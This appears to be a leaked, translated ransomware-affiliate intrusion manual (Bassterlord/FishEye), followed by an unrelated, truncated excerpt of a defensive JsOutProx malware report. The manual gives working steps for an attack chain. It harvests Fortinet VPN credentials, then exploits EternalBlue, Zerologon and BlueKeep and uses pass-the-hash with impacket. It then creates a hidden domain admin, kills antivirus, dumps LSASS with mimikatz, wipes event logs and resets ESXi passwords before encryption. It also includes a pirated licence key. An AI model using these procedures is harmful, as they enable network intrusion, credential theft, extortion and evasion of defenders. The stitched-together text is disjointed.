@@ -1,0 +1,1827 @@
+Bassterlord (FishEye) Networking 
+Manual 
+
+
+
+Foreward
+
+This manual is designed for beginners in the topic.
+
+But above all, for people who will work for me.
+
+All information will be presented in the form of a manual.
+
+There will be no meaningless explanations of how a certain exploit works and 
+mountains of incomprehensible code, we will immediately apply it in practice.
+
+
+
+How to Deploy the Environment
+
+
+
+We need
+
+1. Virtual Player is required (link)
+
+2. VPN (link) — it is best to use this on the main machine (not on the virtual
+machine )
+
+3. Kali Linux torrent (link)
+
+4. Any Windows 10
+
+5. Nmap (link)
+
+6. Mimikaz (link)
+
+7. GMER (link)
+
+8. Scanner (link) — Only use the paid on a virtual machine, do not put on 
+pwned/broken (?пробитые) computers (there will be a free crack next to the 
+archive)
+
+9. Pysecdump (link)
+
+10. Psexec (link)
+
+11. Fortinet VPN (link)
+
+12. Procdump (link)
+
+13. PowerTool (will be in an archive next to the document)
+
+14. Metasploit (link)
+
+15. Bluekeep exploit for 3389 under Windows (located next to it in the archive)
+
+16. IMPACKET «https://github.com/SecureAuthCorp/impacket»
+
+17. Zerologon exploit (in the archive cve-2020-1472-exploit.py)
+
+18. Fortinet exploit «https://github.com/7Elements/Fortigate»
+
+19. Veracript (link)
+
+20. Rent a server for $150 a month jabber bearhost@thesecure.biz
+
+21. TOX for communication and correspondence (link)
+
+
+
+The final layout will look like this
+
+Main machine
+
+Virtualbox
+
+Metasploit
+Mimikatz
+Psexec
+Procdump
+Pysecdump
+
+Standard log and pass Fortinet VPN
+kali - kali Scanner
+Fortinet VPN deb Powertool
+IMPACKET Gmer
+
+IMPACKET
+Zerologon 
+exploit
+NMAP
+TOX
+Bluekeep 
+exploit
+
+
+
+Installing software in Kali
+
+Start the VM, enter login kali, password kali
+
+Copy the Fortinet VPN 123.deb in Kali to the home folder
+
+Open the console and type
+
+sudo dpkg -i 123.deb
+
+Enter the kali password and click enter (passwords in kali are not displayed in 
+the console, you must enter it blindly)
+
+Next, input
+
+sudo git clone  https://github.com/SecureAuthCorp/impacket
+
+cd impacket
+
+sudo python setup.py install
+
+If it requires a password, enter kali
+
+
+
+Installing software on a Windows virtual machine
+
+install everything according to the list from the screen with all the default 
+
+settings.
+
+Install Python https://www.python.org/downloads/
+
+Copy the impacket folder to the C:\ drive
+
+Open the command line in Windows as an administrator
+
+Enter commands:
+
+cd c:\impacket
+
+python setup.py install
+
+Copy the zerologon exploit in python to the impacket folder:
+
+cve-2020-1472-exploit.py
+
+Install everything else as default and copy the software to the desktop.
+
+
+
+Collecting material and how to get it
+
+
+
+For extracting material for work, go to the service 
+
+http://masscan.online/ru
+
+Buy an account of your choice and scan the whole world for popular 
+HTTPS ports, example below:
+
+After the scan is complete, download the results
+
+Go to Kali
+
+Open the console and type
+
+git clone https://github.com/7Elements/Fortigate
+
+cd Fortigate
+
+pip3 install -r requirements.txt 
+
+fortigate.py [-h] [-i INPUT] [-o OUTPUT] [-t THREADS] [-c 
+CREDSCAN]
+
+fortigate.py -i текстовик с нашими айпи (text editor (?) with our 
+IP) -O valid.txt -t 10 -c y
+
+Run and wait for output (?валид)
+
+
+
+As a result we get something like
+
+This will be our material for work, copy our output to the VM with Windows 
+and look at the next section. 
+
+
+
+RANSOMWARE = Terrorism
+You will perform all your actions at your own 
+
+peril and risk. 
+However, the risk is for millions!
+
+I'm not promoting ransoms, it's just a pentest 
+manual.  
+
+
+
+Beginning of work/job
+
+
+
+First, go to the VM under Windows and Open Fortinet VPN 
+
+client
+
+Configure VPN
+
+Click Configure VPN
+
+
+
+Next, enter the username and password vpna
+
+If the connection is successful, you will see
+
+
+
+Next, I recommend copying the cmd file route_print.cmd to the 
+desktop from the archive and running it.
+
+Something like the following picture will appear. Pay attention to the 
+interface and netmask: 
+
+In this case, we see the range:
+
+10.102.96.0 — 255.255.255.0
+
+This means that you will register it in the scanner this way:
+10.102.96.0 — 10.102.96.255
+
+If you saw a picture like this:
+
+10.102.0.0 — 255.255.0.0
+
+Then in the scanner write:
+
+10.102.0.0 — 10.102.255.255
+
+
+
+If we see 
+
+0.0.0.0 — 0.0.0.0
+
+0.0.0.0 — 0.0.0.0 from above 2 times
+So we scan the ranges of the network as in the example above if they 
+are there, if they are not there and there are double lines with zeros 
+then we take and scan the entire range.
+
+192.168.0.0 — 192.168.255.255
+
+Open the Softperfect scanner and enter the resulting ranges.
+
+Enter CTRL+O, the scanner settings will open, set everything as I 
+have done in the screenshots:
+
+
+
+Click ОК
+
+
+
+Go to account settings.
+
+Here we will enter the logins and passwords from our VPN
+
+If you are using the paid version of the scanner then you will have a 
+
+field integration with nmap
+
+
+
+Select(check) SMBEternalBlue and start scanning
+
+After the scan completes, we will see something like this:
+
+Our task is to sort the results by workgroup and TCP ports. And check 
+for the presence of red C $ disks in pluses under the IP address column
+
+
+
+Also do not forget that if you have a paid version of the scanner, 
+you'll need some alternative settings
+
+
+
+Ports and their correspondences with services
+
+General:135,137,139,445,8080,80,443
+
+Nas synology port: 5000,5001 - Data store
+
+Veeam: 9443,9392,9393,9401,6160 - Backups
+
+DB mysql,mssql,db2,postgresql:3306,1433,50000,5432,5433 -Database
+
+Veritas backup exec. 6101,10000,3527,6106,1125,1434,6102 server 
+3527,6106 - Backups
+
+Oracle: 1521,1522
+
+Remote control: 22,21,3389 4899,5900 - Possibility of alternative 
+connection to a computer
+Nfs: 111,1039,1047,1048,2049
+
+Iscsi: 860,3260
+
+replication: 902,31031,8123,8043,5480,5722
+
+Sophos Web: 4444
+
+Sophos Console: 2195,8190,8191,8192,8193,8194,49152-65535 
+
+In the far right column after the scan, we will see vulnerable devices 
+for the Eternal Blue vulnerability (MS-17-010) .
+Next, we will look at the exploitation of this vulnerability in detail.
+
+
+
+MS-17-010 (Eternal Blue)
+
+To exploit the vulnerability, you will need Metasploit 
+
+installed on a virtual machine. 
+
+Open the CMD console in Windows
+
+Register msfconsole, press enter and wait for metasploit to load 
+
+After loading metasploit, enter the commands one by one: 
+
+setg LHOST (IP of our VPNA)
+
+
+
+setg RHOSTS (IP of our vulnerable devices, separated by a 
+space)
+
+use exploi t/wi ndows/smb/ms17_010_psexec
+
+set payload payload/wi ndows/meterpreter/bi nd_tcp 
+
+exploit
+
+The end result looks like this:
+
+Press enter and hope for success
+
+If successful, you will see this:
+
+In case of errors, ACCESS DENIED
+
+You can try to encrypt the antivirus payload using the 
+commands below:
+
+
+
+set EnableStageEncodi ng true
+
+set StageEncoder x86/shi kata_ga_nai
+
+set encoder x86/shi kata_ga_nai
+
+set Exi tOnSessi on false
+
+set Sessi onCommuni cati onTi meout 0
+
+exploit
+
+Next, we wait for the completion of the process and watch active 
+sessions meterpreter-a
+
+The sessions command displays a list of computers by numbering that 
+the exploit managed to break through
+
+In our case, we have 2 open sessions.
+Let's move on to the first command, sessions 1
+
+Next, we enter the commands:
+
+getsystem
+
+load kiwi
+
+sysinfo – here we are interested in whether the computer is in the 
+
+domain
+
+In this case, we see that yes, it is in the domain.
+
+
+
+Next, enter the hashdump command
+We get a list of user hashes, and copy them into a separate 
+
+text editor.
+
+Next, enter creds_all — this command will try to get unencrypted 
+passwords from the system
+
+
+
+We also copy them into a separate text document.
+If we have several sessions in the meter, then enter the bg command 
+and repeat the above points starting with sessions, only now we enter 
+
+sessions 2, etc. Let's not go through all the sessions yet.
+
+Next, without closing the console, go to the service
+
+https://www.crackmd5.ru/ and try to decrypt the hashes received.
+We have already obtained the open passwords of the accounts from 
+
+the creds_all command.
+
+Put them into the scanner 
+Settings => Account Management
+
+Enter accounts in the format Domain \ login password.
+
+After that, close the account control panel, select all IP addresses and 
+rescan the network.
+
+
+
+Then we expand/open all of the "pluses" in the IP address 
+column and review the rights received.
+
+We are interested in red local disks C$
+
+If there are red disks everywhere in the domain, this means that we 
+have received the administrator's domain on the network and we 
+
+have rights to read and change data everywhere on the remote 
+machine. 
+
+
+
+If only on several machine, it means only the rights of local 
+administrators and it is worth looking for other accounts.
+
+If we do not have open passwords but only hashes that could not be 
+decrypted, we will consider the hash login vulnerabilities in the PASS 
+
+THE HASH attacks section.
+
+If the open computer with the red C$  drive does not have port 3389, 
+you can use the psexec tool, which we will go over in a separate 
+
+section.
+Using the following parameters and comparing the IP sessions, it can 
+
+be determined whether we accessed the server through the 
+vulnerability.
+
+Or by the hostname in which the DC is present. 
+
+For example WHDC.domain.local (the values can be anything, it's 
+important for us to find out DC exactly)
+
+Then in the service session, you can execute the commands
+
+shell
+
+net group
+
+net group "Domain Admins" /domain
+
+This will help us find out the accounts of domain administrators and 
+accordingly, is not cluttered with ordinary users and their accounts. 
+
+The level "GOD" is important to us, right? :) 
+
+
+
+Zerologon
+
+
+
+To exploit the vulnerability, we need to scan the network and determine the DC 
+- Domain Controller
+
+How to determine it is described on page 28 above
+
+We need to be connected to the network on which we operate, and also have 
+Python installed on Windows
+
+Also, Impacket upacked on the C:\impacket path with the exploit 
+cve-2020-1472-exploit.py already in it
+
+Also, put a .cmd file on the desktop with the following content:
+
+We will rewrite it and launch it for the purposes we need on the network. 
+
+
+
+Делаем сортировку по аккаунтам пользователей и подставляем нужные
+нам значения до первой точки как на скриншоте ниже
+
+Save the Zerologon.cmd file and run it again, it all depends on whether the 
+server is patched against this vulnerability or not.
+
+We repeat this action on all DCs in turn until we get a positive result:
+
+
+
+If the 'Performing authentication attempts' line takes more than 4 minutes or 
+gives a negative result, go to the next DC or use other vulnerabilities if none of 
+
+the DCs are vulnerable.
+
+Sometimes DCs do not impersonate themselves and it is necessary to scan all 
+machines in the domain (workgroup) with this exploit, but this bears fruit.
+
+After a successful operation, go to Kali.
+
+Connect to the company's VPN
+
+
+
+Open the console and enter the following:
+
+cd impacket/examples
+
+sudo python3 secretsdump.py -no-pass -just-dc AGLEADER/ag40server\$@192.168.16.27
+
+Press enter, it will ask to enter the password, enter 'kali' (it won't show up) and 
+
+press enter
+
+Wait for the process of extracting accounts and hashes. 
+
+Once it's complete, copy everything that the console provided.
+
+
+
+Next, go to the service https://www.crackmd5.ru/
+
+Trying to decrypt the administrator hash (highlighted in yellow)
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:48b3420f6a0f7ae1fb29104b213154ee:::
+
+If we decrypt the password, we boldly break into all computers with these 
+creds, not forgetting to substitute an example for the working group:
+
+AGLEADER\Administrator and our password.
+
+If we do not receive the password we need to use the Pass The Hash attack.
+
+
+
+Pass The Hash
+
+
+
+So we have hashes, but we could not get the password from the admin account. 
+Return to Kali.
+
+If you closed the console, open it again
+
+input cd impacket/examples
+
+sudo python3 smbexec.py -hashes
+aad3b435b51404eeaad3b435b51404ee:48b3420f6a0f7ae1fb29104b213154ee
+
+Administrator@192.168.16.27
+
+or
+
+sudo python3 psexec.py -hashes
+aad3b435b51404eeaad3b435b51404ee:48b3420f6a0f7ae1fb29104b213154ee
+
+We substitute our data obtained from the Zerologon operation
+
+After execution we will get CMD on the remote DC machine – C:\Windows\system32> 
+
+Next, enter the following commands:
+
+net user support Pa$$wo0rd /add
+
+net user support /active:yes
+
+net localgroup Administrators support /add
+
+If we break "High Profile" we can immediately create our own domain admin (? 
+
+Original: Если ломимся по «Громкому» можем создать сразу своего домен админа )
+
+net group "Domain Admins" support /add
+
+After that, we get our account with domain administrator rights and, accordingly, we can 
+break into all the machines on the domain using that account:
+
+support Pa$$wo0rd
+
+Next, go to the DC and remove the creds of the domain admin with mimikatz 64.exe or 
+
+32.exe. Commands:
+
+privilege::debug  -  log 1234.txt  - sekurlsa::logonPasswords full
+
+
+
+AV Bypass
+
+
+
+Connect to the computer, and first look at the tray near the clock and the icons 
+displayed. Look for AV.
+
+If simply Windows Defender is installed on the computer, go to the settings and 
+add the C:\ drive to the exceptions.  
+
+
+
+Usually antivirus without a password can stupidly be uninstalled through the 
+uninstallation wizard in Windows.
+
+It is important if we see AV Sophos (blue) or Sentinel installed.
+
+on all machines, further work with this company will be meaningless.
+
+Other antivirus solutions can be easily killed through 2 tools:
+
+ Gmer
+
+PowerTool
+
+If you can't kill AV, open the Windows registry
+
+follow the path:
+
+A computer\HKEY_LOCAL_MACHINE\SOFTWARE
+
+and look for folders with AV names
+
+Look at all the subfolders that are in the folder with AV, our goal is to find the 
+folders and values inside them with the name 'Exclusions'.
+
+Suppose we found the value of the exceptions, let's say
+
+С:\users\admin\java.exe
+
+Rename malware to java.exe and throw it on this path, if there is no such path 
+or folders on this machine, create 1-in-1 folders as indicated in the exceptions 
+
+and try to run our file. 
+
+In most cases, AV does not see this if it isn't too smart. :)
+
+If nothing comes out of the above, we stomp on all machines in the domain on 
+port 3389 from the scanner and see if the AV is installed there.
+
+
+
+If AV is not installed on several machines, you can put a portable softperfect 
+scanner there, scan the network from the inside, mount the disks and run our 
+
+h*cker, sorry choked =D 
+
+Ideally, you need to kill AV wherever possible and add C:\ drives to the 
+exceptions
+
+And for computers that don't have port 3389, including NAS storages, mount 
+and only then start lkh k yes what is that =D 
+
+
+
+NAS and Backups
+
+
+
+The hardest part :) 
+
+So we got access to the domain admin
+
+We scan the network from the inside
+
+We look at all ports 
+
+Usually our storages hang on ports
+
+5000,5001
+
+and backups
+
+Veeam: 9443,9392,9393,9401,6160
+
+Veritas backup exec. 6101,10000,3527,6106,1125,1434,6102   server 3527,6106 
+
+or they will be signed in the hostname as NAS
+
+Usually, we hang out outside the domain, first of all we look at the scan if we 
+now have access to them from a regular scan with the domain admin accounts
+
+
+
+However, if we are in the workgroup, you can break through all the domain 
+administrators and try to log into them using creds without a domain from the 
+pwned accounts. This is done through the web interface by opening the NAS IP 
+
+through the browser and specifying the NAS port separated by a colon.
+
+In 40 % of cases, domain admin creds should be suitable.
+
+Log in as Admin with the same password, or try password from other domain 
+admins, the probability of breaking through increases.
+
+Sometimes when scanning NAS through Softperfect, accounts are displayed that 
+are active in the repository, usually this:
+
+Admin, backup, Sysadm, etc.
+
+If we opened the network through PASS THE HASH, look for these accounts in 
+the results of the received hashes and get passwords from them through the 
+
+hash cracking service.
+
+With veeam and other backups, the same thing.
+
+And the most important thing at the Hacker stage, we need to start with disks 
+and computers where the most memory is from 500 gigs and more. 
+
+Accordingly, the most important and the first will be
+"Big data"
+
+
+
+VС и  ESXI
+
+
+
+This section will hold great and terrible for 
+me (?):
+
+Boris Nikolaevich Yeltsin
+(Борис Николаевич Ельцин)
+
+ Aka. https://xss.is/members/204378/
+
+
+
+The trick is that you don't need to bypass the AV
+First you need to get creds from the vCenter
+
+60% of the time it is in the domain and on AD creds
+
+Otherwise, the keylogger
+
+In my work, I often face the task of resetting the root password on esx. 
+
+Let's imagine a situation where we have vCenter administrator credentials, there 
+is a domain admin and the whole network is ready to fuck, but we couldn't catch 
+
+the password under esx. Here's one of the ways. 
+
+No reboot, without being too obvious (?)
+
+BUT I STRONGLY RECOMMEND RESETTING THE PASS IN THE NIGHT 
+BEFORE THE OPEN NETWORK (?)
+
+That is, you reset the password and encrypt it right away.
+
+This method is consists of entering esx into the domain and then we will be able 
+to log in using the credentials of the domain administrator. 
+
+Then create a global ESX Admins group there, be sure to include our domain 
+admin there.
+
+Then we return to vcenter
+
+Select the esx host, press configure - Authentication Service  - Join domain
+
+Enter the domain in the format domain.local or domain.com, which domain can 
+be found by entering systeminfo on the computer in the domain.
+
+Enter the login of the domain administrator without a domain and password. 
+Now everything is ready for authorization, go to the esx host using the domain 
+
+admin credentials and reset the root pass.
+
+Then you just go to esx via ssh
+
+Turn off the machine.
+
+And you do dirty deeds =)
+
+
+
+ PSEXEC
+
+
+
+In this section, we will look at the Psexec tool and how it will be useful in 
+practice.
+
+First of all, it will help us run any file on all machines to which we have 
+access.
+
+Suppose we have an exe file that we need to run 
+
+Open CMD and drag psexec.exe there
+
+and then write the following
+
+text editor with IP addresses the account of the domain password from domain 
+of the computers on which admin together with the the file to run
+
+admin
+we run the file domain
+
+If you removed all AVs, added exceptions and did everything right, this exe 
+will run on all computers.
+
+If you need to run the file on behalf of the system, add the file.exe to the 
+parameters -s -d -c
+
+Through Psexec, you can get and remove creds from remote computers if they 
+do not have port 3389 but we have an account.
+
+Open the C$ folder through the scanner and drop  pysecdump.exe
+
+and procdump.exe
+
+the account of the domain 
+the IP of the machine we domain admin 
+
+admin together with the 
+are going to take from the password
+
+domain remotely open a 
+scanner and a red disk C$ cmd on behalf of 
+
+the system on a 
+remote machine
+
+
+
+So we got in the machine doing
+
+cd C:\
+
+pysecdump.exe -s
+
+This command will give us the admin hashes on the remote computer, we are 
+trying to break through the site or use  PASS THE HASH in Kali or other 
+
+machines.
+
+Next, we do
+
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\ 
+WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+procdump.exe --accepteula -ma lsass.exe lsass.dmp
+
+If successful, an lsass.dmp file will be created on the remote machine on the C:\ 
+drive.
+
+Copy it to your computer next to mimikatz.exe
+
+We open mimikatz and do it in:
+
+sekurlsa::minidump lsass.dmp
+
+privilege::debug
+
+log 1234.txt
+
+sekurlsa::logonPasswords full
+
+It will also give us creds or hashes.
+
+Next, you can try to remotely enable the rdp port with the command
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ 
+Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+Doesn't always work!
+
+After executing the command, it will be possible to be cut to the RDP
+
+Do not forget to delete all files and traces of work on the remote machine.
+
+
+
+After all the actions, if you want to wipe the traces of your stay to a 
+minimum and postpone the break-in
+
+On the machines that you entered using RDP, you can open powershell and 
+
+type the following:
+
+wevtutil el | Foreach-Object {wevtutil cl "$_"}
+
+This will erase all logs ("evidence"? literally translated as magazines)
+
+Also, commands for removing hidden accounts cmd
+
+net user support Pa$$wo0rd /delete
+
+net group "Domain Admins" support /delete
+
+
+
+
+
+
+Cobalt Strike 
+
+
+
+How I see all PPs
+Advert
+
+Speak! Do you know Cobalt?
+
+Simply put, the above methods described by me 
+completely exclude Cobalt, well, if people ask why 
+
+not?
+
+
+
+In short, we rent a server for Linux
+Throw Cobalt there
+
+Type this in the console
+cd cs4.0
+
+java -XX:ParallelGCThreads=4 -
+Dcobaltstrike.server_port=50050 -
+
+Djavax.net.ssl.keyStore=./cobaltstrike.store -
+Djavax.net.ssl.keyStorePassword=123456 -server -XX:
+
++AggressiveHeap -XX:+UseParallelGC -
+javaagent:Hook.jar -classpath ./cobaltstrike.jar 
+
+server.TeamServer IP SERVER 12345
+
+Switch to my machine, I work from Windows in Cobalt 
+For this, you must first install Java
+
+Run cobaltstrike.bat
+
+Enter the IP of our rented host account and the 
+password that is specified in the config above.
+
+
+
+Go to this section.
+
+Create a listener.
+
+Next, create a payload.
+
+
+
+After clicking the Generate button, we will have 
+an executable, push it to the DC and run it there.
+
+Next, we do:
+
+In the same place, select
+
+
+
+Then go to
+
+We select all the machines on the network and try to 
+break into them using the admin hash.
+
+
+
+It is worth mentioning that machines do not always 
+go to the general Internet.
+
+
+
+Then do 
+
+We turn the infected computer into a local listener on 
+which all machines in the area will knock =D
+
+There is no point in describing the rest of the 
+functionality, since for me Cobalt is only suitable for 
+conveniently removing creds and searching for creds 
+
+from NAS.
+And so it's just bat guano that burns like a Christmas 
+
+tree (?) with all that is possible and a crypt for this 
+threshing floor costs fucking money and you still need 
+
+a programmer who will rewrite the payload haha.  
+
+
+
+BLUEKEEP
+
+
+
+I'm donating a self-written exploit to you for 3389
+
+All you need to do is add an IP from 3389 
+
+in a column without ports and run run.bat
+
+If you open run.bat through a text editor, you will see 
+the creds of the hidden accounts that will be created on 
+
+the computers pwned by the exploit.
+Гуды будут сохранены в отдельный текстовик.
+
+The exploit first tries to turn the remote machine into a 
+blue screen and waits for them to reboot.
+
+After rebooting, it automatically executes the payload 
+and we get a hidden account with admin rights on the 
+
+vulnerable computer.
+
+
+
+This exp needs to be restarted 2-3 times, it does not 
+always work as needed, this is due to the restart timings 
+
+on remote machines.
+Well, now after we have buried the sellers of RDP 
+
+accesses, you can proceed to the conclusion.
+
+
+
+Here is collected knowledge that will help you earn one 
+way or another, this is all that I knew.
+
+The source of illustrations for this manual is taken 
+from the Fish Eye Place Manual
+
+https://www.yuumeiart.com/
+
+I do not argue that there are people smarter than me 
+and with a much wider, vast store of knowledge, but as 
+for me this is enough for a pentest of any network, be it 
+
+Citrix, Cisco, Palo Alto, Pulse, Fortinet. 
+Bonus license for Softperfect until 2022
+
+dUYiN30Q4+ydHwgPCwku3K
++FYDomodEqW0bRGcTyxvdnlc7g4nne7cfwXOGPJbBVdPeqEs7jzX2yDiVxxiiNaCvNK4T7ML0Qfarren5vr  
+MZEBcoOivf7QQ05BPxSG370cIus/AZxAuRAcibpckx1Ie+R4UTNiyBh6ZVcIwii+8M1lnRp+lcRmFqbgLGZ/
+
+cbzzh09IfaFKwoGJRPcTcnizxQtBJSk9sqlbNc6SwWeiQgl+0J+A1mrkrG3zd03vSjBUbc8daN08ebjOGYDsZVptkkhe5ASAJt/
+Uwzs0QCqO2issqS+QpE/atLV3lR63k/
+
+2G1y6yECKu7w+s1SV9aEKsxKhuBJplKLhbGoQIX7hGxDwww1HFLGqCZbAce1mz7aP6xqqltEgoM2oVvKv02tVUoLGYSHYtAGGoaks l
+XXu4+MLs26nLUoltIfIcOC1dOQsjChjXil8Im+dDOY+V1m5M0e2GckmBjTX4blWbz+hOmjl23n6f0jSndxT70Dd3Jl9
+
+
+
+Financial Institutions in the Sight of New JsOutProx Attack Waves
+yoroi.company/research/financial-institutions-in-the-sight-of-new-jsoutprox-attack-waves/
+
+August 31, 2021
+
+08/31/2021
+
+Introduction 
+When threat actors evolve, their tools do so. Observing the evolution of the threats we track during our cyber defense operations is part of
+what we do to secure our customers. Back in 2019, the Yoroi’s Malware ZLAB unit discovered a complete new malware implant named
+“JsOutProx” (TH-264), a complex JavaScript-based RAT used to attack financial institutions in the APAC area.  
+
+In the last two years, the evolution of this implant was clear. After our initial discovery, many security research teams started monitoring this
+elusive threat, both ZScaler researchers and Fortinet ones began tracking the actor activities too, then we started noticing the sophistication of
+the malicious code. The actor behind JsOutProx (TH-264), also dubbed as SOLAR SPIDER in the CrowdStrike naming scheme, is protecting
+the new code with improved protection mechanisms and at the same time we started noticing signs of a potential emergent expansion of
+the attack operations to western financial organizations. 
+
+In this report, Yoroi’s Malware ZLAB dissects the latest version of JsOutProx malware and defeats its new protection mechanisms to unveil its
+full offensive capabilities. 
+
+1/13
+
+
+
+Figure 1: Yoroi Flashcard about JsOutProx 
+
+Technical Analysis 
+
+Hash 65987f95b365501579431ea8dec1d45940430d8c9defad58908a14e6fb96a347 
+
+Threat JsOutProx 
+
+Brief Description JsOutProx RAT – Jun 2021 
+
+File Size 2276KB 
+
+Ssdeep 24576:eOa0QS/9pn7qKkxds34NPoE3j2hYW8jecNH2Pzw83ZEkTE50DngGfayxg3qfDOoX:Pl 
+
+Table 1: Static information about the sample 
+
+The infection starts with a malicious phishing messages attending to be a bank transaction. It also leverages the classic Masquerading
+technique (T1036), pretending to be a PDF file instead of a JS code. 
+
+Besides this elementary technique, we decided to deepen the improvements of the various versions we observed. The first immediate basic
+static evidence which we noticed is the increasing of the file size. In fact, we started to analyze the first documented version which was about
+800KB, and now it is three time the original one, letting immediately think about the fact that the malware writers improved
+the obfuscation strategies, and not only, they enriched the capabilities of the malicious code. 
+
+Digging inside the new JsOutProx version 
+This new variant has a more sophisticated level of obfuscation than the previous versions, enhancing the anti-analysis capabilities. The high-
+level structure of the code can be synthetized in the following figure: 
+
+2/13
+
+
+
+Figure 2: High level structure of the malicious JavaScript 
+
+The first part of the malicious code is a long array containing about 30k of encrypted strings encoded in Base-64 format: 
+
+Figure 3: Piece of the long array containing the encrypted information 
+
+After that, we spotted a piece of code looking as a decoding stub, composed by the following primitives: 
+
+Figure 4: Prototipe of the decoding routines 
+
+The most interesting function of the ones reported below is the “H” function because it hides the main decoding routine.
+
+3/13
+
+
+
+Figure 5: Piexe of the recursive decoding routine 
+
+This function represents unambiguous evidence of how the attacker enhanced the code obfuscation because the body has been rewritten to
+be recursive, making the analysis harder and to avoid detection. 
+
+After that decoding stub, we isolated the configuration of the malware: this time the structure of the configuration is similar
+to the previous versions of JsOutProx.  After the deobfuscation operations we obtained an acceptable human-readable result: 
+
+Figure 6: Example of the deobfuscation process 
+
+4/13
+
+
+
+The configuration of the malware is substantially similar since le initial versions of the samples but there are a couple field we decided to report
+the most relevant of them: 
+
+Field name Description 
+
+Fs Gain FileSystem privileges to Read-Write files 
+
+Wsh Allow the program to execute WScript files 
+
+Sh Allow the program to execute command line programs 
+
+BaseUrl C2 URL 
+
+StartDate Date of the starting infection 
+
+InstallDir Directory of the malware installation 
+
+Delimiter Separator used by the malware to delimit the exfiltrated information 
+
+SleepTime Delay of the malware Execution 
+
+Password A password probably used to decrypt some content in some  
+
+Tag Tag of the campaign (which we initially used to name the malware family as JsOutProx) 
+
+IDPrefix A parameter set during the sending the Cookie in requests to the C2 
+
+ProxyActions A new parameter indicating if the malware is a “proxy” for other process. In particular, the malware starts every
+time it needs to execute a command a new process from the command line 
+
+StartArgs A series of arguments allowing the malware to customize the infection 
+
+ViewOnly A new boolean parameter indicating whether the infection is in view only mode: if it is so, the
+malware cannot modify anything on the system, but only exfiltrate and modify the malware  
+
+Table 2: Configuration of JsOutProx 
+
+Two of these configuratons are particularly interesting to understand the flexibility of the implant: “ProxyActions” and “ViewOnly”.  This malware
+can also operate as a silent info stealer making it an impressive reconnaissance tool for the initial phases of an intrusion, but it can also
+be leveraged to run more advanced, and noisy, offensive plugins using proxy processes to keep the main infection process safe
+from detection and security terminations. 
+
+Offensive Capabilities 
+After that, we have an exceptionally extensive list of interpreted commands used by the malware. Over the years, these commands have been
+modified and their body changed, so we decided to report a comprehensive list of them to provide a clear outlook about the offensive
+capabilities of this javascript-based malware:
+
+Interpreted Commands Description 
+
+["getUa"] Ua stands for the interpreter of that commands 
+
+["getUuid"] Retrieves the Uuid of the malicious process 
+
+["isHTA"] Return true if the malicious script is an HTA file 
+
+["isWScript"]  Return true if the malicious script is a WScript-readable file 
+
+["sleepPing"] Use ping to localhost as a sleep technique 
+
+["sleep"]  Sleep for a set time 
+
+["sleepEx"] Sleep for a set time 
+
+["scriptName"] Retrieve the script name  
+
+["scriptFullName"]  Retrieve the full name of the malicious script 
+
+["scriptParentDir"] Retrieve the path of the script  
+
+["launch"]  Launch a command 
+
+["getJavaPath"] Retrieve the java path 
+
+["checkJrePath"] Check the existence of JRE 
+
+5/13
+
+
+
+["getLaunchCommand"] Retrieve the command 
+
+["installOrRun"] Decide if install or run without persistence 
+
+["install"] Install the malware persistence 
+
+["unInstall"] Uninstall the malware 
+
+["getLauncher"] Get the Launcher Process (it can be MSHTA, WScript, Powershell) 
+
+["addRegistry"] Write a new Registry key in RunSubKey config key 
+
+["removeRegistry"] Remove a new Registry key in RunSubKey config key 
+
+["addStartup"]  Set the persistence through the the Autorun Registry Key 
+
+["removeStartup"]  Remove the persistence 
+
+["exit"]  Kill the malware process 
+
+["getFullBody"] Retrieve the full body of the response of the C2 with all the commands separated by the Delimiter 
+
+["setZone"] Set a specific Time zone 
+
+["update"]  Update the malware Core 
+
+["restart"] Restart the malware process 
+
+["receive"] Receive is a listener to interpret the commands sent by the C2. The commands are: “fnm”: send ScriptFullName to the
+invoke DownloadPlugin “sp”: invoke ScreenPShellPlugin “cn”: invoke ShellPlugin “in”: invoke InfoPlugin “sh”: invoke S
+
+["launchArgs"] Execute the malware with the arguments 
+
+["getArgs"]  Retrieve the arguments of the malware 
+
+["init"]  Malware initializations 
+
+["Base64"] A sort of constructor for Base64 commands family 
+
+["Base64"]["encode"] Encode a stream in Base64 format 
+
+["Base64"] Encode a string in Base64 format 
+["encodeString"] 
+
+["Base64"]["encodeFile"] Encode a file in Base64 Format 
+
+["Base64"]["decode"] Decode a file or a stream from Base64Format 
+
+["Base64"] Decode a string from Base64Format 
+["decodeString"] 
+
+["Environment"] A constructor for Environment commands 
+
+["Environment"] Retrieve the username of the infected machine 
+["userName"] 
+
+["Environment"] Retrieve the computer name of the infected machine 
+["computerName"] 
+
+["Environment"] Retrieve the username inside the domain 
+["userDomain"] 
+
+["Environment"] Retrieve the encoding of the strings by reading the registry key: “HKLM\SYSTEM\CurrentControlSet\Control\Nls\Code
+["encoding"] 
+
+["Environment"] Retrieve the engine version of the interpreter 
+["engineVersion"] 
+
+["Environment"] Set a specific engine interpreter 
+["engine"] 
+
+["Hex"] A sort of connstructor for the Hex command family 
+
+["Hex"]["encodeBytes"] Encode a byte-stream in hex format 
+
+["Hex"]["encode"] Encode a stream in hex format 
+
+["Hex"]["encodeFile"] Encode a file in Hex Format 
+
+6/13
+
+
+
+["Hex"]["decodeBytes"] Decode a stream from the Hex Format 
+
+["Hex"]["decode"] Decode a stream or a file from the hex format 
+
+["Http"] A sort of constructor oh Http Command family 
+
+["Http"]["create"] Construct a "WinHttp.WinHttpRequest.5.1" request 
+
+["Http"]["addHeaders"] Add new Headers to the HttpRequest 
+
+["Http"]["post"] Prepare the Post Request 
+
+["Http"]["get"] Prepare the Get Request 
+
+["Http"]["head"] Prepare the Head Request 
+
+["Http"]["send"] Send efiltrated info to the C2 
+
+["Http"]["uploadFile"] Upload a File to the C2  
+
+["Http"]["downloadFile"] Download a file from the C2 
+
+["MessageBag"] A sort of constructor for internal log messages 
+
+["MessageBag"]["info"] Log an info 
+
+["MessageBag"]["error"] Log an error 
+
+["Moment"] A sort of constructor for Moment object 
+
+["Moment"] Retrieve the exact time of the machine 
+["getDayString"] 
+
+['Os']  A sort od constructor for Os commands 
+
+['Os']["caption"] Get a screenshot of the machine 
+
+['Os']["security"] Retrieve che security configuration through WMI query 
+
+['Os']["isResolution"] Retrieve the Resolution of the HTA application of the malware 
+
+['Os'] Retrieve the screen resolution 
